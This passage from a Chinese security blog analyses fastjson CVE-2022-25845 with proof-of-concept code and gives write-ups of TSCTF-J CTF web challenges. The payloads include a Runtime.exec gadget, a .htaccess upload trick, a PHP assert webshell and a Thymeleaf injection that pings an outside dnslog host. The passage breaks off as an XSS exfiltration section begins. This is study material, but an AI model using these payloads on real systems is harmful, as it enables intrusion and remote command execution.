boolean">false</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">long</span> expectHash <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">fnv1a_64</span><span class="token punctuation">(</span>expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>expectHash <span class="token operator">!=</span> <span class="token operator">-</span>8024746738719829346L <span class="token operator">&amp;&amp;</span> expectHash <span class="token operator">!=</span> 3247277300971823414L <span class="token operator">&amp;&amp;</span> expectHash <span class="token operator">!=</span> <span class="token operator">-</span>5811778396720452501L <span class="token operator">&amp;&amp;</span> expectHash <span class="token operator">!=</span> <span class="token operator">-</span>1368967840069965882L <span class="token operator">&amp;&amp;</span> expectHash <span class="token operator">!=</span> 2980334044947851925L <span class="token operator">&amp;&amp;</span> expectHash <span class="token operator">!=</span> 5183404141909004468L <span class="token operator">&amp;&amp;</span> expectHash <span class="token operator">!=</span> 7222019943667248779L <span class="token operator">&amp;&amp;</span> expectHash <span class="token operator">!=</span> <span class="token operator">-</span>2027296626235911549L <span class="token operator">&amp;&amp;</span> expectHash <span class="token operator">!=</span> <span class="token operator">-</span>2114196234051346931L <span class="token operator">&amp;&amp;</span> expectHash <span class="token operator">!=</span> <span class="token operator">-</span>2939497380989775398L<span class="token punctuation">)</span> <span class="token punctuation">{</span>            expectClassFlag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            expectClassFlag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>fastjson 在1.2.61开始，把黑名单从十进制数变成了十六进制数，你可以在<a href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson-blackist</a>仓库中查看被列入Fastjson黑名单的类的hash值。</p><pre class=" language-1"><code class="language-1">-8024746738719829346L:java.io.Serializable3247277300971823414L:java.lang.Cloneable-5811778396720452501L:java.io.Closeable-1368967840069965882L:java.lang.AutoCloseable2980334044947851925L:java.lang.Readable5183404141909004468L:java.lang.Runnable7222019943667248779L:java.util.EventListener-2027296626235911549L:java.lang.Iterable-2114196234051346931L:java.util.Collection-2939497380989775398L:java.lang.Object</code></pre><p>注意到<code>if (!internalWhite &amp;&amp; (this.autoTypeSupport || expectClassFlag))</code>中有对<code>this.autoTypeSupport</code>的check，那是否可以利用<code>expectClassFlag</code>去绕过这个check，我们发现当<code>expectClass</code>不为<code>null</code>或者黑名单中的值时，<code>expetClassFlag</code>为真。</p><h3 id="Throwable"><a href="#Throwable" class="headerlink" title="Throwable"></a>Throwable</h3><p>我们发现<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer</code>中的<code>deserialze</code>中调用了<code>checkAutoType()</code>。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    key <span class="token operator">=</span> lexer<span class="token punctuation">.</span><span class="token function">scanSymbol</span><span class="token punctuation">(</span>parser<span class="token punctuation">.</span><span class="token function">getSymbolTable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>lexer<span class="token punctuation">.</span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            lexer<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>lexer<span class="token punctuation">.</span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">16</span> <span class="token operator">&amp;&amp;</span> lexer<span class="token punctuation">.</span><span class="token function">isEnabled</span><span class="token punctuation">(</span>Feature<span class="token punctuation">.</span>AllowArbitraryCommas<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    lexer<span class="token punctuation">.</span><span class="token function">nextTokenWithColon</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>JSON<span class="token punctuation">.</span>DEFAULT_TYPE_KEY<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>lexer<span class="token punctuation">.</span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"syntax error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        String exClassName <span class="token operator">=</span> lexer<span class="token punctuation">.</span><span class="token function">stringVal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        exClass <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">checkAutoType</span><span class="token punctuation">(</span>exClassName<span class="token punctuation">,</span> Throwable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lexer<span class="token punctuation">.</span><span class="token function">getFeatures</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        lexer<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在<code>exClass = parser.getConfig().checkAutoType(exClassName, Throwable.class, lexer.getFeatures());</code>这里会执行，并且调用<code>checkAutoType</code>时有传入<code>Throwable.class</code>作为<code>expectClass</code>的值。</p><p>在<code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class&lt;?&gt;, java.lang.reflect.Type)</code>的<code>public ObjectDeserializer getDeserializer(Class&lt;?&gt; clazz, Type type)</code>函数中会有检测目标类中是否属于Throwable 的扩展</p><pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>Collection<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    deserializer <span class="token operator">=</span> CollectionCodec<span class="token punctuation">.</span>instance<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    deserializer <span class="token operator">=</span> MapDeserializer<span class="token punctuation">.</span>instance<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>Throwable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    deserializer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThrowableDeserializer</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>PropertyProcessable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    deserializer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PropertyProcessableDeserializer</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> InetAddress<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    deserializer <span class="token operator">=</span> MiscCodec<span class="token punctuation">.</span>instance<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    deserializer <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">createJavaBeanDeserializer</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> <span class="token punctuation">(</span>Type<span class="token punctuation">)</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>漏洞的核心在于<code>else if (Throwable.class.isAssignableFrom(clazz)) {deserializer = new ThrowableDeserializer(this, clazz);}</code>，如果目标类属于<code>Throwable</code>的扩展类，就可以调用<code>checkAutoType</code>，实现打开<code>autoType</code>的操作，去调用任何类。<br>尝试一下</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>fastjson<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token keyword">extends</span> <span class="token class-name">Error</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String str<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="CVE-2022-25845利用"><a href="#CVE-2022-25845利用" class="headerlink" title="CVE-2022-25845利用"></a>CVE-2022-25845利用</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>fastjson<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PocDemo</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String json <span class="token operator">=</span> <span class="token string">"{\"@type\":\"java.lang.Exception\",\"@type\":\"com.example.fastjson.Poc\",\"name\":\"calc\"}"</span><span class="token punctuation">;</span>        JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><a href="https://blog.csdn.net/include_voidmain/article/details/124983839">https://blog.csdn.net/include_voidmain/article/details/124983839</a><br><a href="https://www.jianshu.com/p/d4702da8b93e">https://www.jianshu.com/p/d4702da8b93e</a><br><a href="https://blog.csdn.net/qq_38154820/article/details/125912678">https://blog.csdn.net/qq_38154820/article/details/125912678</a><br><a href="https://blog.csdn.net/chence19871/article/details/126955148">https://blog.csdn.net/chence19871/article/details/126955148</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022 TSCTF-J web部分复现</title>
      <link href="/2022/12/13/TSCTF-J%20web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/12/13/TSCTF-J%20web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="TSCTF-J-web部分复现"><a href="#TSCTF-J-web部分复现" class="headerlink" title="TSCTF-J web部分复现"></a>TSCTF-J web部分复现</h1><h2 id="OnlyIMG"><a href="#OnlyIMG" class="headerlink" title="OnlyIMG"></a>OnlyIMG</h2><p>F12有hint，<code>/www.zip</code>获取源码，有upload.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"ph"</span><span class="token punctuation">,</span><span class="token string">"htm"</span><span class="token punctuation">,</span><span class="token string">"ini"</span><span class="token punctuation">,</span><span class="token string">"js"</span><span class="token punctuation">,</span><span class="token string">"jtml"</span><span class="token punctuation">,</span> <span class="token string">"as"</span><span class="token punctuation">,</span><span class="token string">"cer"</span><span class="token punctuation">,</span> <span class="token string">"swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Error !"</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$dst</span> <span class="token operator">=</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>A<span class="token operator">-</span>Secret<span class="token operator">-</span>Path<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span> <span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 不能说的秘密</span>        <span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$dst</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token punctuation">{</span>                 <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Upload Fail , Do not upload strange file ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token punctuation">,</span> <span class="token string">"&lt;?p"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Upload Fail , Why is there PHP code in your pic ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dst</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dst</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"$fileinfo[1]/$fileinfo[0]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$msg</span><span class="token operator">=</span><span class="token string">"Upload Success ! Your file name is : %s"</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$fileinfo</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>But I don't know where it stores......"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Please select your file to upload first !"</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>还有一段javascript写的waf</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Checkfiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> fup <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> fileName <span class="token operator">=</span> fup<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">var</span> ext <span class="token operator">=</span> fileName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>fileName<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ext <span class="token operator">==</span> <span class="token string">"gif"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">"GIF"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">"JPEG"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">"jpeg"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">"jpg"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">"JPG"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">"png"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">"PNG"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Only Pics are allowed !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这题的第一个考点就是找到上传路径，与TSCTF2022那题类似，都利用了格式化字符串漏洞，令文件名为<code>%s</code>，即可输出<code>$dst</code>，<br><img src="https://kingofkb.github.io/medias/image/20221022/dst.png"><br>得到路径<code>./707470</code>。尝试访问报错，通过报错信息得知是Apache服务器。<br>接着分析upload.php还进行了哪些过滤。首先，对一些文件名后缀进行了过滤，然后还过滤了<code>&lt;?</code>，由于是Apache服务器，考虑用<code>.htaccess</code>。可以用传统的方法，也可以直接用我之前学到的新姿势，由于已经告诉flag位置，所以<code>.htaccess</code>中的内容可以为</p><pre class=" language-.htaccess"><code class="language-.htaccess">AddType application/x-httpd-php .jpgphp_value auto_append_file /flag</code></pre><p>最后上传一个空的1.jpg，访问即可得到flag:TSCTF-J{Ht_Of_4PachE_is_7O0_simpL3_r1ght?} </p><h2 id="寒秋送温暖"><a href="#寒秋送温暖" class="headerlink" title="寒秋送温暖"></a>寒秋送温暖</h2><p>打开环境即可得到</p><pre class=" language-php"><code class="language-php">        <span class="token delimiter">&lt;?php</span>            <span class="token variable">$upload_dir</span> <span class="token operator">=</span> <span class="token string">"*****"</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$upload_dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$upload_dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/htaccess/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Not this!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">"image/jpg"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"only jpg!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/eval/i"</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span><span class="token punctuation">{</span>                    @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$upload_dir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                                  <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">"Goooood file! The directory is "</span><span class="token punctuation">.</span><span class="token variable">$upload_dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                    <span class="token delimiter">?></span></code></pre><p>分析一下，大概不允许上传<code>.htaccess</code>，不允许有<code>eval</code>，同时还有一个MIME检测。直接上传一句话木马<code>&lt;?php @assert($_POST['cmd']); ?&gt;</code>即可，本地jpg，发包用burpsuite改成php，修改文件类型为image/jpg。<br><img src="https://kingofkb.github.io/medias/image/20221022/uploadsuccess.png"><br>得到flag:TSCTF-J{R3a11y_Ez_check_1N}</p><h2 id="百里香之叶"><a href="#百里香之叶" class="headerlink" title="百里香之叶"></a>百里香之叶</h2><p>打开题目，随便点一种语言，然后发现url中有传<code>lang</code>值，随便输入一个值，发现报错<br><img src="https://kingofkb.github.io/medias/image/20221022/error.png"><br>搜索报错发现是Springboot的报错页，猜测是针对Sprintboot框架Thymeleaf 模板注入（看mix爹的wp发现，Thymeleaf翻译过来正好是百里香之叶）。网上搜payload尝试<code>__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22ping%20wwwss.ks4yd3.dnslog.cn%22).getInputStream()).next()%7d__::.x</code>，报错<br><img src="https://kingofkb.github.io/medias/image/20221022/hack.png"><br>尝试后发现new被过滤，将new urlencode一下，命令改成<code>cat /flag</code>，得到flag:TSCTF-J{7h3_t1me_Th4t_y0u_le@ve!}。</p><h2 id="你的名字"><a href="#你的名字" class="headerlink" title="你的名字"></a>你的名字</h2><p>出题人很贴心的写出了文档，按下<code>让TA看看我的回答！</code>按钮时，bot会访问myasks界面，随便写一个问题，看看myasks界面。<br><img src="https://kingofkb.github.io/medias/image/20221022/myasks.png"><br>同时出题人告诉我们，flag就是用户名，所以我们想办法xss外带。<br>这题在username和answer处都可以注入。<br>username</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">checkUserName</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> username<span class="token punctuation">.</span>length<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">}</span></code></pre><p>password</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sanitizeAnswer</span><span class="token punctuation">(</span>questions<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>q <span class="token keyword">of</span> questions<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 把 &lt; 替换成html实体 